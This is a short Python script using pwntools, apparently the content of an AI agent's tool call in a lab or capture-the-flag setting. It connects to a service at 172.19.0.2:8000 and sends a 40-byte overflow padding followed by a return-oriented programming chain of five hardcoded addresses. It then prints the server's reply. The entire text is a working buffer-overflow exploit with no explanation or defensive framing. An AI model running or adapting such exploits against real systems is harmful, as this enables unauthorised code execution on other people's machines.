from pwn import *
context.log_level='debug'
p=remote('172.19.0.2',8000,timeout=4)
p.recvline();p.recvline()
chain=[0x40054e,0x400793,0x4007b4,0x400560,0x400687]
p.sendline(b'A'*40+b''.join(p64(x) for x in chain))
try: print('RESULT',repr(p.recvrepeat(2)))
except Exception as e: print(e)
p.close()
PY", "timeout_seconds": 12}
